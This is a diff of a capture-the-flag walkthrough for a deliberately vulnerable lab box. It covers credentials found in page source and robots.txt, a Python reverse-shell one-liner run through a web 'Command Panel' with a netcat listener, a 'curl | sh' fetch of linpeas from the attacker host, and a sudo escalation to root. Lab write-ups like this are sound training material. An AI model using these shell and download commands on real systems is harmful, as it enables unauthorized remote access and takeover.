@@ -4,6 +4,7 @@
 export IP=10.10.189.1
 ```
 
+
 ## Scans
 
 ### Nmap
@@ -14,12 +15,12 @@ Open Ports:
 80 -- webserver
 ```
 
-Found on webserver page source
+Found in webpage's page source:
 ```
 Username: R1ckRul3s
 ```
 
-Found in /robots.txt
+Found in /robots.txt, possible password
 ```
 Wubbalubbadubdub
 ```
@@ -57,19 +58,22 @@ This tells us other Ingredients are in the file system
 grep . clue.txt
 ```
 
+
 ## Reverse Shell
 
 the 'Command Panel' in `/portal.php` runs Python3
 
-Netcat Listening Port:
+Netcat Listening Port: (On Host)
 ```bash
 nc -lnvp 9001
 ```
 
-Reverse Shell Command:
+Reverse Shell Command: (In 'Command Panel', with Host tun0 IP, and '9001' port)
 ```
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.2.80.57",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
+
+Reverse Shell Achieved.
 
 Upgrading Shell to TTY:
 ```bash
@@ -90,7 +94,7 @@ On Host:
 sudo python -m SimpleHTTPServer 80
 ```
 
-On Target:
+On Target: (with Host tun0 IP)
 ```bash
 cd /dev/shm/
 curl 10.2.80.57/linpeas.sh | sh
@@ -110,6 +114,12 @@ sudo bash
 Root Shell Achieved.
 
 **Third Ingredient Found**: `fleeb juice`
+```bash
+whoami
+cd /root/
+ls
+cat 3rd.txt
+```
 
 
 ## Final Ingredients List:
